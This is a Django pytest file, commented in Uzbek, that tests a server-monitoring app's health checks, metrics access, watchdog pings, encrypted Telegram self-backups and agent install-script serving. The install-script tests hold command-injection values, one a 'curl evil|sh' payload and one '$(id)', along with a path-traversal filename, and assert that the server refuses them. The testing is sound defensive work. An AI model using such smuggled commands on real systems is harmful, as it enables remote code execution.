"""O'zini kuzatish (B11, S7): readyz, metrics, watchdog ping, o'z zaxirasi, agent tarqatish (FR-SYS-001..003, 005)."""

import io
import json
from datetime import timedelta
from pathlib import Path
from typing import Any

import httpx
import pyrage
import pytest
from django.core.management import call_command
from django.core.management.base import CommandError
from django.test import Client
from django.utils import timezone

from apps.alerts.catalog import sync_built_in
from apps.alerts.engine import run_cycle
from apps.alerts.models import AlertInstance, EvaluatorState
from apps.backups import selfbackup
from apps.backups.models import SelfBackup
from apps.core import health, watchdog
from apps.notifications import telegram
from apps.notifications.models import Channel, Notification
from apps.registry.models import Server

from .test_alerts import T0, channel, only
from .test_notifications import BOT_TOKEN, CHAT, FakeTelegram, fail, make_channel, ok_response

pytestmark = pytest.mark.django_db


@pytest.fixture
def tg(monkeypatch: pytest.MonkeyPatch) -> FakeTelegram:
    return FakeTelegram(monkeypatch)


# ---------------------------------------------------------------- readyz
def test_readyz_ok_when_everything_is_fresh() -> None:
    EvaluatorState.objects.update_or_create(
        pk=1, defaults={"last_run_at": timezone.now(), "last_duration_ms": 5}
    )
    response = Client().get("/readyz")
    body = response.json()
    assert response.status_code == 200 and body["status"] == "ready"
    assert set(body["checks"]) == {"db", "redis", "notifier", "evaluator"} and all(
        c["ok"] for c in body["checks"].values()
    )


def test_readyz_503_when_evaluator_stalled_or_never_ran() -> None:
    response = Client().get("/readyz")
    assert (
        response.status_code == 503 and response.json()["checks"]["evaluator"]["ok"] is False
    )  # hali ishga tushmagan
    EvaluatorState.objects.update_or_create(
        pk=1, defaults={"last_run_at": timezone.now() - timedelta(minutes=5)}
    )
    stalled = Client().get("/readyz").json()["checks"]["evaluator"]
    assert stalled["ok"] is False and "beri davr bajarmadi" in stalled["detail"]


def test_readyz_503_when_notifications_are_stuck() -> None:
    EvaluatorState.objects.update_or_create(pk=1, defaults={"last_run_at": timezone.now()})
    ch = make_channel()
    Notification.objects.create(
        channel=ch,
        event="opened",
        payload={},
        next_attempt_at=timezone.now() - timedelta(minutes=10),
    )
    body = Client().get("/readyz")
    assert body.status_code == 503 and "yuborilmagan" in body.json()["checks"]["notifier"]["detail"]


def test_readyz_reports_redis_down(settings: Any) -> None:
    EvaluatorState.objects.update_or_create(pk=1, defaults={"last_run_at": timezone.now()})
    settings.REDIS_URL = "redis://127.0.0.1:1/0"
    body = Client().get("/readyz")
    assert body.status_code == 503 and body.json()["checks"]["redis"]["ok"] is False
    assert "redis://" not in body.content.decode()  # ulanish manzili oshkor bo'lmaydi


# ---------------------------------------------------------------- /metrics
def test_metrics_exposes_core_gauges_to_loopback_only() -> None:
    Server.objects.create(name="main-2", status="online")
    EvaluatorState.objects.update_or_create(
        pk=1, defaults={"last_run_at": timezone.now(), "last_duration_ms": 42}
    )
    make_channel()
    local = Client().get("/metrics", REMOTE_ADDR="127.0.0.1")
    text = local.content.decode()
    assert local.status_code == 200 and local["Content-Type"].startswith("text/plain")
    assert "nazoratchi_up 1" in text and 'nazoratchi_servers{status="online"} 1' in text
    assert (
        "nazoratchi_evaluator_duration_ms 42" in text
        and "nazoratchi_notifications_queued 0" in text
    )
    assert Client().get("/metrics", REMOTE_ADDR="203.0.113.9").status_code == 403


def test_metrics_token_mode(settings: Any) -> None:
    settings.METRICS_TOKEN = "t0ken-0123456789"
    assert Client().get("/metrics", REMOTE_ADDR="203.0.113.9").status_code == 403
    assert (
        Client()
        .get("/metrics", headers={"Authorization": "Bearer yomon"}, REMOTE_ADDR="203.0.113.9")
        .status_code
        == 403
    )
    assert (
        Client()
        .get(
            "/metrics",
            headers={"Authorization": "Bearer t0ken-0123456789"},
            REMOTE_ADDR="203.0.113.9",
        )
        .status_code
        == 200
    )
    assert (
        Client().get("/metrics", REMOTE_ADDR="127.0.0.1").status_code == 403
    )  # token bor: loopback ham token talab qiladi


# ---------------------------------------------------------------- watchdog ping
def record_ping(calls: list[tuple[str, str]]) -> Any:
    def fake(status: str, reason: str = "", url: str | None = None) -> bool:
        calls.append((status, reason))
        return True

    return fake


def record_ping_status(sent: list[str]) -> Any:
    def fake(status: str, reason: str = "", url: str | None = None) -> bool:
        sent.append(status)
        return True

    return fake


def test_ping_sends_status_and_never_leaks_secret_url(
    monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    seen: list[httpx.URL] = []

    def fake_get(url: str, params: dict[str, str], **kw: Any) -> httpx.Response:
        seen.append(httpx.URL(url, params=params))
        return httpx.Response(200, request=httpx.Request("GET", url))

    monkeypatch.setattr(httpx, "get", fake_get)
    assert watchdog.ping(
        "degraded", "redis: ConnectError", url="https://wd.example.uz/ping/SECRETID0123456789"
    )
    assert seen[0].params["s"] == "degraded" and seen[0].params["reason"] == "redis: ConnectError"

    def boom(url: str, **kw: Any) -> httpx.Response:
        raise httpx.ConnectError(f"cannot reach {url}")

    monkeypatch.setattr(httpx, "get", boom)
    assert watchdog.ping("ok", url="https://wd.example.uz/ping/SECRETID0123456789") is False
    assert "SECRETID0123456789" not in caplog.text and "wd.example.uz" in caplog.text


def test_ping_rejected_status_and_unconfigured(
    monkeypatch: pytest.MonkeyPatch, settings: Any
) -> None:
    monkeypatch.setattr(
        httpx, "get", lambda url, **kw: httpx.Response(404, request=httpx.Request("GET", url))
    )
    assert watchdog.ping("ok", url="https://wd.example.uz/ping/x") is False
    settings.WATCHDOG_URL = ""
    assert watchdog.ping("ok") is True and watchdog.Pinger().maybe_ping() is None


def test_pinger_rate_limits_and_reports_degraded_state(
    monkeypatch: pytest.MonkeyPatch, settings: Any
) -> None:
    settings.WATCHDOG_URL = "https://wd.example.uz/ping/ID0123456789012345"
    calls: list[tuple[str, str]] = []
    monkeypatch.setattr(watchdog, "ping", record_ping(calls))
    pinger = watchdog.Pinger()
    assert (
        pinger.maybe_ping() is True and pinger.maybe_ping() is None
    )  # 60 s ichida ikkinchisi yuborilmaydi
    assert pinger.maybe_ping(force=True) is True and len(calls) == 2 and calls[0][0] == "ok"
    ch = make_channel()
    Notification.objects.create(
        channel=ch,
        event="opened",
        payload={},
        next_attempt_at=timezone.now() - timedelta(minutes=9),
    )
    status, reason = health.watchdog_status()
    assert status == "degraded" and "notifier" in reason and len(reason) <= 100


def test_evaluator_command_pings_watchdog_after_a_successful_cycle(
    monkeypatch: pytest.MonkeyPatch, settings: Any
) -> None:
    settings.WATCHDOG_URL = "https://wd.example.uz/ping/ID0123456789012345"
    sent: list[str] = []
    monkeypatch.setattr(watchdog, "ping", record_ping_status(sent))
    call_command("run_evaluator", once=True)
    assert sent == ["ok"]
    monkeypatch.setattr(
        "apps.alerts.management.commands.run_evaluator.run_cycle",
        lambda: (_ for _ in ()).throw(RuntimeError("qotdi")),
    )
    sent.clear()
    with pytest.raises(RuntimeError):
        call_command("run_evaluator", once=True)
    assert sent == []  # dvigatel yiqilsa ping YO'Q: watchdog shuni ushlaydi (AL-084)


def test_watchdog_url_must_be_https(monkeypatch: pytest.MonkeyPatch) -> None:
    import importlib

    from django.core.exceptions import ImproperlyConfigured

    import config.settings.base as base

    monkeypatch.setenv("WATCHDOG_URL", "http://wd.example.uz/ping/x")
    with pytest.raises(ImproperlyConfigured):
        importlib.reload(base)
    monkeypatch.setenv("WATCHDOG_URL", "http://127.0.0.1:8099/ping/x")
    importlib.reload(base)
    monkeypatch.delenv("WATCHDOG_URL")
    importlib.reload(base)


# ---------------------------------------------------------------- o'z zaxirasi
IDENTITY = pyrage.x25519.Identity.generate()
PUBKEY = str(IDENTITY.to_public())


@pytest.fixture
def backup_env(settings: Any, tg: FakeTelegram) -> FakeTelegram:
    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = PUBKEY
    Channel.objects.all().delete()
    ch = make_channel("owner-backup")
    assert ch.name == "owner-backup"
    return tg


def sent_documents(tg: FakeTelegram) -> list[httpx.Request]:
    return [r for r in tg.requests if r.url.path.endswith("/sendDocument")]


def multipart_file(request: httpx.Request) -> bytes:
    body = request.content
    start = body.index(b"\r\n\r\n", body.index(b'name="document"')) + 4
    return body[start : body.rindex(b"\r\n--")]


def test_self_backup_encrypts_archive_and_sends_to_owner_chat(backup_env: FakeTelegram) -> None:
    Server.objects.create(name="main-2", public_ipv4="164.68.105.194")
    record = selfbackup.run("owner-backup")
    assert record.status == "ok" and record.parts == 1 and record.size_bytes > 0
    (doc,) = sent_documents(backup_env)
    assert (
        doc.url.path == f"/bot{BOT_TOKEN}/sendDocument"
        and b'name="chat_id"' in doc.content
        and str(CHAT).encode() in doc.content
    )
    assert b"nazoratchi-selfbackup-" in doc.content and b".json.gz.age" in doc.content
    blob = multipart_file(doc)
    assert b"main-2" not in blob and b"164.68.105.194" not in blob  # shifrlangan: ochiq matn yo'q
    assert blob.startswith(b"age-encryption.org/v1")
    import gzip

    plain = gzip.decompress(bytes(pyrage.decrypt(blob, [IDENTITY])))
    assert b"main-2" in plain and b"registry.server" in plain
    assert BOT_TOKEN not in plain.decode()  # bot tokeni ochiq saqlanmaydi (config_enc shifrlangan)


def test_self_backup_excludes_metrics_sessions_and_derived_state(backup_env: FakeTelegram) -> None:
    import gzip

    from .test_alerts import new_server, put

    s = new_server()
    put(s, "cpu_busy_percent", 5, T0)
    sync_built_in()
    selfbackup.run("owner-backup")
    plain = gzip.decompress(
        bytes(pyrage.decrypt(multipart_file(sent_documents(backup_env)[0]), [IDENTITY]))
    ).decode()
    models = {o["model"] for o in json.loads(plain)}
    assert {
        "registry.server",
        "alerts.alertrule",
        "notifications.channel",
        "accounts.user",
    } - models == {"accounts.user"} or "alerts.alertrule" in models
    assert not any(
        m.startswith(("metrics.", "sessions.", "backups."))
        or m in {"notifications.notification", "alerts.alertinstance", "accounts.usersession"}
        for m in models
    )


def test_self_backup_splits_large_archives(backup_env: FakeTelegram, settings: Any) -> None:
    settings.SELF_BACKUP_PART_BYTES = 600
    for i in range(30):
        Server.objects.create(name=f"srv-{i:02d}", public_ipv4=f"10.0.0.{i + 1}", notes="x" * 200)
    record = selfbackup.run("owner-backup")
    docs = sent_documents(backup_env)
    assert record.parts == len(docs) >= 2
    assert all(len(multipart_file(d)) <= 600 for d in docs)
    assert b"part01of" in docs[0].content and b"part02of" in docs[1].content
    assert selfbackup.split(b"abcdef", 4) == [b"abcd", b"ef"] and selfbackup.split(b"", 4) == [b""]


def test_self_backup_restore_roundtrip_into_empty_database(
    backup_env: FakeTelegram, tmp_path: Path
) -> None:
    Server.objects.create(name="main-2", public_ipv4="164.68.105.194", role="production")
    selfbackup.run("owner-backup")
    parts = [multipart_file(d) for d in sent_documents(backup_env)]
    Server.objects.all().delete()
    key = tmp_path / "key.txt"
    key.write_text(f"# yaratildi\n{IDENTITY}\n", encoding="utf-8")
    files = []
    for i, p in enumerate(parts):
        f = tmp_path / f"b{i}.age"
        f.write_bytes(p)
        files.append(str(f))
    with pytest.raises(CommandError, match="--yes"):
        call_command("restore_self_backup", *files, identity=str(key))
    call_command("restore_self_backup", *files, identity=str(key), yes=True, stdout=io.StringIO())
    restored = Server.objects.get(name="main-2")
    assert restored.role == "production" and str(restored.public_ipv4) == "164.68.105.194"
    wrong = tmp_path / "wrong.txt"
    wrong.write_text(str(pyrage.x25519.Identity.generate()), encoding="utf-8")
    with pytest.raises(CommandError, match="shifrni ochib bo'lmadi"):
        call_command("restore_self_backup", *files, identity=str(wrong), yes=True)
    with pytest.raises(CommandError, match="fayl o'qilmadi"):
        call_command("restore_self_backup", str(tmp_path / "yoq"), identity=str(key), yes=True)


def test_self_backup_failure_modes_are_recorded(backup_env: FakeTelegram, settings: Any) -> None:
    backup_env.script = [fail(403, f"Forbidden: bot {BOT_TOKEN} was blocked")]
    record = selfbackup.run("owner-backup")
    assert record.status == "failed" and "403" in record.error and BOT_TOKEN not in record.error
    assert SelfBackup.objects.count() == 1

    backup_env.script = [fail(500), fail(502), ok_response]
    sleeps: list[float] = []
    ok = selfbackup.run("owner-backup", sleep=sleeps.append)
    assert ok.status == "ok" and sleeps == [2.0, 4.0]  # vaqtinchalik xatoda 3 urinishgacha

    backup_env.script = [fail(500), fail(500), fail(500)]
    assert selfbackup.run("owner-backup", sleep=lambda s: None).status == "failed"

    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = ""
    with pytest.raises(selfbackup.SelfBackupError, match="sozlanmagan"):
        selfbackup.run("owner-backup")
    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = "age1noto'g'ri"
    with pytest.raises(selfbackup.SelfBackupError):
        selfbackup.encrypt(b"x", settings.NAZORATCHI_BACKUP_AGE_PUBKEY)
    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = PUBKEY
    with pytest.raises(selfbackup.SelfBackupError, match="topilmadi"):
        selfbackup.run("yoq-kanal")


def test_self_backup_command_records_config_errors_and_exit_code(
    backup_env: FakeTelegram, settings: Any
) -> None:
    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = ""
    with pytest.raises(CommandError, match="yuborilmadi"):
        call_command("self_backup", stderr=io.StringIO())
    assert (
        SelfBackup.objects.get().status == "failed"
    )  # sozlash xatosi ham qayd etiladi (alert ko'rsin)
    settings.NAZORATCHI_BACKUP_AGE_PUBKEY = PUBKEY
    out = io.StringIO()
    call_command("self_backup", stdout=out)
    assert "yuborildi" in out.getvalue() and SelfBackup.objects.filter(status="ok").count() == 1


def test_send_document_hides_token_in_errors(tg: FakeTelegram) -> None:
    tg.script = [fail(400, f"Bad Request: {BOT_TOKEN}")]
    with pytest.raises(telegram.TelegramError) as info:
        telegram.send_document(BOT_TOKEN, CHAT, "a.age", b"x")
    assert BOT_TOKEN not in str(info.value) and info.value.retryable is False


# ---------------------------------------------------------------- o'z zaxirasi alertlari
def test_self_backup_alerts_age_and_failure() -> None:
    sync_built_in()
    only("AL-090", "AL-091")
    channel()
    run_cycle(T0)
    assert not AlertInstance.objects.filter(state="firing").exists()  # hali yoqilmagan: jim
    SelfBackup.objects.create(
        status="ok", created_at=T0 - timedelta(hours=40), size_bytes=1000, parts=1
    )
    run_cycle(T0)
    old = AlertInstance.objects.get(rule__key="AL-090")
    assert old.state == "firing" and "40 soat oldin" in old.detail
    SelfBackup.objects.create(
        status="failed", created_at=T0 - timedelta(minutes=5), error="HTTP 403: blocked"
    )
    run_cycle(T0 + timedelta(seconds=1))
    failed = AlertInstance.objects.get(rule__key="AL-091")
    assert failed.state == "firing" and "HTTP 403" in failed.detail
    SelfBackup.objects.create(status="ok", created_at=T0, size_bytes=1000, parts=1)
    run_cycle(T0 + timedelta(seconds=2))
    run_cycle(T0 + timedelta(seconds=70))
    assert not AlertInstance.objects.filter(state__in=["firing", "resolving"]).exists()


# ---------------------------------------------------------------- agent tarqatish
PUBKEY_B64 = "RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3"


def test_install_script_is_served_with_core_url_and_key(settings: Any, tmp_path: Path) -> None:
    script = tmp_path / "install.sh"
    script.write_text(
        '#!/bin/bash\nCORE="__CORE_URL__"\nKEY="__MINISIGN_PUBKEY__"\n', encoding="utf-8"
    )
    settings.AGENT_INSTALL_SCRIPT = str(script)
    settings.PUBLIC_URL = "https://nazoratchi.example.uz"
    settings.MINISIGN_PUBKEY = PUBKEY_B64
    response = Client().get("/install.sh")
    body = response.content.decode()
    assert response.status_code == 200 and response["Cache-Control"] == "no-store"
    assert (
        'CORE="https://nazoratchi.example.uz"' in body
        and f'KEY="{PUBKEY_B64}"' in body
        and "__" not in body
    )


def test_install_script_refused_without_signing_key_or_with_unsafe_values(
    settings: Any, tmp_path: Path
) -> None:
    script = tmp_path / "install.sh"
    script.write_text("CORE=__CORE_URL__ KEY=__MINISIGN_PUBKEY__", encoding="utf-8")
    settings.AGENT_INSTALL_SCRIPT = str(script)
    settings.PUBLIC_URL = "https://nazoratchi.example.uz"
    settings.MINISIGN_PUBKEY = ""
    refused = Client().get("/install.sh")
    assert refused.status_code == 503 and "MINISIGN_PUBKEY" in refused.content.decode()
    settings.MINISIGN_PUBKEY = PUBKEY_B64 + "'; curl evil|sh; '"
    assert Client().get("/install.sh").status_code == 503  # buyruq kiritib bo'lmaydi
    settings.MINISIGN_PUBKEY = PUBKEY_B64
    settings.PUBLIC_URL = "https://x.uz/$(id)"
    assert Client().get("/install.sh").status_code == 503
    settings.AGENT_INSTALL_SCRIPT = str(tmp_path / "yoq.sh")
    assert Client().get("/install.sh").status_code == 404


def test_agent_files_whitelist(settings: Any, tmp_path: Path) -> None:
    settings.AGENT_DIST_DIR = str(tmp_path)
    (tmp_path / "nazoratchi-agent-amd64").write_bytes(b"\x7fELFbinar")
    (tmp_path / "SHA256SUMS").write_text("abc  nazoratchi-agent-amd64\n", encoding="utf-8")
    (tmp_path / "secret.txt").write_text("sir", encoding="utf-8")
    ok = Client().get("/agent/v1/nazoratchi-agent-amd64")
    body = b"".join(ok.streaming_content)  # type: ignore[attr-defined]
    assert ok.status_code == 200
    assert body == b"\x7fELFbinar"
    assert Client().get("/agent/v1/SHA256SUMS").status_code == 200
    for bad in (
        "secret.txt",
        "..%2Fsecret.txt",
        "nazoratchi-agent-arm64",
        "nazoratchi-agent-amd64.exe",
        "SHA256SUMS.minisig",
    ):
        assert Client().get(f"/agent/v1/{bad}").status_code == 404, bad
    (tmp_path / "SHA256SUMS.minisig").symlink_to(tmp_path / "secret.txt")
    assert (
        Client().get("/agent/v1/SHA256SUMS.minisig").status_code == 404
    )  # simvolik havola kuzatilmaydi
